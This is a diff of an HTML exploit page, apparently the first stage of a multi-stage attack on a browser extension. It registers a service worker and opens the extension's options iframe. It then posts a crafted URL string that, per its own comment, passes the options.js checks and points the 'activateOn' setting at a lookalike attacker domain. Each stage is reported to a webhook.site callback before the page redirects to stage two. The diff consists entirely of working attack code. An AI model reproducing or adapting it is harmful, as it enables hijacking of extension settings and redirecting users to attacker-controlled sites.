@@ -4,18 +4,15 @@
 <body>
   <script>
     async function run() {
-      // 1. Register Service Worker & Wait for Active Control
-      const reg = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
+      // 1. Register SW
+      await navigator.serviceWorker.register('/sw.js', { scope: '/' });
       await navigator.serviceWorker.ready;
 
       if (!navigator.serviceWorker.controller) {
-        await new Promise(resolve => {
-          navigator.serviceWorker.addEventListener('controllerchange', resolve, { once: true });
-        });
+        await new Promise(r => navigator.serviceWorker.addEventListener('controllerchange', r, { once: true }));
       }
 
-      // Keepalive fetch to ensure Webhook receives 1_sw_active
-      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_sw_active', { keepalive: true });
+      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_sw_ready', { keepalive: true });
 
       // 2. Open options iframe
       const iframe = document.createElement('iframe');
@@ -23,26 +20,15 @@
       document.body.appendChild(iframe);
 
       iframe.onload = () => {
-        // Send payload repeatedly to guarantee options.js picks it up
-        const payload = {
-          activateOn: 'https://doc.rust-lang.org.serverpit.com',
-          href: 'https://doc.rust-lang.org/?bypass=1',
-          url: 'https://doc.rust-lang.org/?bypass=1',
-          data: {
-            activateOn: 'https://doc.rust-lang.org.serverpit.com',
-            href: 'https://doc.rust-lang.org/?bypass=1'
-          }
-        };
-
+        // Send string URL that passes options.js checks & sets activateOn to our origin!
+        const payload = 'https://doc.rust-lang.org.serverpit.com/#https://doc.rust-lang.org/';
         iframe.contentWindow.postMessage(payload, '*');
 
-        // Ping to confirm postMessage fired
-        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_postmessage_sent', { keepalive: true });
+        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_hijacked', { keepalive: true });
 
-        // Wait 3.5 seconds to ensure storage write finishes before navigating to stage2
         setTimeout(() => {
           window.location.href = '/stage2.html';
-        }, 3500);
+        }, 2000);
       };
     }
     run();
